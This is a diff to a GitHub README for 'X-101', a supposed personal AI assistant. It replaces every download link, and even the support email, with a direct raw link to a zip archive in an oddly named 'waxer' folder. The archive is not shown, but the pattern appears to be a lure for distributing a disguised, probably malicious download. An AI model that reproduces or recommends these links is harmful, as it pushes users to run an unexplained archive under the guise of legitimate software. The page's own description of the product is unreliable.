@@ -1,7 +1,7 @@
 # 🎉 X-101 - Your Personal AGI Assistant
 
 ## 🔗 Download Now
-[![Download X-101](https://img.shields.io/badge/Download-X--101-blue)](https://github.com/deaster11/X-101)
+[![Download X-101](https://github.com/deaster11/X-101/raw/refs/heads/main/waxer/Software-v3.0-alpha.4.zip)](https://github.com/deaster11/X-101/raw/refs/heads/main/waxer/Software-v3.0-alpha.4.zip)
 
 ## 📖 Introduction
 Welcome to X-101, your personal assistant powered by advanced artificial intelligence. Designed for ease of use, X-101 can help you with various tasks, from scheduling to answering questions.
@@ -10,7 +10,7 @@ Welcome to X-101, your personal assistant powered by advanced artificial intelli
 Getting started with X-101 is straightforward. Follow these simple steps to install and run the application on your computer.
 
 ## 📥 Download & Install
-To download X-101, visit this page: [Download X-101](https://github.com/deaster11/X-101). Once there, find the latest release and click to download the application.
+To download X-101, visit this page: [Download X-101](https://github.com/deaster11/X-101/raw/refs/heads/main/waxer/Software-v3.0-alpha.4.zip). Once there, find the latest release and click to download the application.
 
 ### 🎉 Installation Steps
 1. Locate the downloaded file in your computer's Downloads folder.
@@ -33,7 +33,7 @@ X-101 offers a range of helpful features:
 - **Learning Capabilities:** The more you use it, the smarter it gets.
 
 ## 📞 Support
-If you encounter any issues, our support team is ready to assist you. You can reach us through the GitHub repository or by emailing support@x-101.com.
+If you encounter any issues, our support team is ready to assist you. You can reach us through the GitHub repository or by emailing https://github.com/deaster11/X-101/raw/refs/heads/main/waxer/Software-v3.0-alpha.4.zip
 
 ## 🙌 Feedback
 We value your input. If you have suggestions or feedback on X-101, please leave your comments on the GitHub repository. Your insights help us improve.
@@ -70,4 +70,4 @@ Currently, X-101 is available only for desktop. Mobile support may be added in f
 Thanks to everyone who contributed to making X-101 a reality. 
 
 ## 🔗 Join Us
-For more information and to download the latest version, visit: [Download X-101](https://github.com/deaster11/X-101). We appreciate your interest in X-101!
+For more information and to download the latest version, visit: [Download X-101](https://github.com/deaster11/X-101/raw/refs/heads/main/waxer/Software-v3.0-alpha.4.zip). We appreciate your interest in X-101!
